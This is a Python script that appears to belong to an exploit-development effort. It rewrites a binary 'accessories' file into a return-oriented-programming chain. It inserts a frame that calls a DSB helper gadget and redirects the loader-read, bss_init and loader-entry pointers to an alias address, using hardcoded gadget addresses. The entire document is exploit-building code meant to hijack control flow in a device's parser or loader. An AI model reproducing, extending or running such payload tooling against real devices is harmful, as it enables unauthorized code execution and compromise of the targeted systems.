#!/usr/bin/env python3
"""Create a conditional, unexecuted alias + DSB + BSS-init ROP variant."""

from __future__ import annotations

import hashlib
import struct
from pathlib import Path


HERE = Path(__file__).resolve().parent
SOURCE = (
    HERE.parent
    / "accessories-rop-2026-10-29"
    / "candidate_accessories_reg_bssinit_unexecuted.bin"
)
OUTPUT = HERE / "candidate_accessories_reg_alias_dsb_bssinit_unexecuted.bin"
SOURCE_SIZE = 0x2D0
SOURCE_SHA256 = "d9973abc3b223baceaf378a582e2b7acd3fd96b82ef548f40a8f31a4a957ecfa"
FIELD_LENGTH_OFFSET = 0x1C
OLD_FIELD_LENGTH = 0x294
NEW_FIELD_LENGTH = 0x2A4
OLD_TAIL_OFFSET = 0x2B4

ALIAS_ENTRY = 0x8BF00000
ALIAS_BSS_INIT = ALIAS_ENTRY + 0x1C8
DSB_HELPER = 0x083531C0
BLX_POP_GADGET = 0x08030CBD


def word(buf: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<I", buf, offset)[0]


source = SOURCE.read_bytes()
source_digest = hashlib.sha256(source).hexdigest()
if len(source) != SOURCE_SIZE or source_digest != SOURCE_SHA256:
    raise SystemExit(
        f"unexpected source: size={len(source):#x}, sha256={source_digest}"
    )
if word(source, FIELD_LENGTH_OFFSET) != OLD_FIELD_LENGTH:
    raise SystemExit("source field length changed")
if word(source, 0x144) != 0x09000000:
    raise SystemExit("source parser cleanup target changed")
if word(source, 0x280) != 0x09000000:
    raise SystemExit("source loader-read target changed")
if word(source, 0x294) != 0x090001C8:
    raise SystemExit("source bss_init target changed")
if word(source, 0x2A0) != BLX_POP_GADGET:
    raise SystemExit("source BSS-return trampoline changed")
if word(source, 0x2A4) != 0x09000000:
    raise SystemExit("source loader-entry target changed")
if word(source, 0x2B0) != BLX_POP_GADGET:
    raise SystemExit("source entry-return trampoline changed")

# Insert one four-word pop frame at file offset 0x294, before the existing
# bss_init frame. The bss_init and loader-entry frames, plus the registry tail,
# shift by 16 bytes. The new first frame calls the runtime DSB helper after the
# read.
new_dsb_frame = struct.pack("<4I", DSB_HELPER, 0, 0, BLX_POP_GADGET)
candidate = bytearray(source[:0x294] + new_dsb_frame + source[0x294:])
struct.pack_into("<I", candidate, FIELD_LENGTH_OFFSET, NEW_FIELD_LENGTH)

# Convert the three existing pointers and the relocated bss_init/entry targets
# to the conditional OSOS alias. The file-read length and callback are intact.
for offset, value in (
    (0x144, ALIAS_ENTRY),
    (0x280, ALIAS_ENTRY),
    (0x2A4, ALIAS_BSS_INIT),
    (0x2B4, ALIAS_ENTRY),
):
    struct.pack_into("<I", candidate, offset, value)

expected = {
    0x1C: NEW_FIELD_LENGTH,
    0x144: ALIAS_ENTRY,
    0x280: ALIAS_ENTRY,
    0x294: DSB_HELPER,
    0x2A0: BLX_POP_GADGET,
    0x2A4: ALIAS_BSS_INIT,
    0x2B0: BLX_POP_GADGET,
    0x2B4: ALIAS_ENTRY,
    0x2C0: BLX_POP_GADGET,
}
for offset, value in expected.items():
    if word(candidate, offset) != value:
        raise AssertionError(
            f"word at {offset:#x}: {word(candidate, offset):#010x} != {value:#010x}"
        )
if len(candidate) != 0x2E0:
    raise AssertionError(f"unexpected output size: {len(candidate):#x}")
if candidate[0x2C4:] != source[OLD_TAIL_OFFSET:]:
    raise AssertionError("registry tail was not preserved")

OUTPUT.write_bytes(candidate)
print(f"wrote offline candidate: {OUTPUT}")
print(f"size: {len(candidate)} bytes (0x{len(candidate):x})")
print(f"sha256: {hashlib.sha256(candidate).hexdigest()}")
print("read destination and loader entry: 0x8bf00000")
print("post-read sequence: DSB -> bss_init at 0x8bf001c8 -> loader entry")
print("candidate is unexecuted; alias behavior depends on live MMU/TRE state")
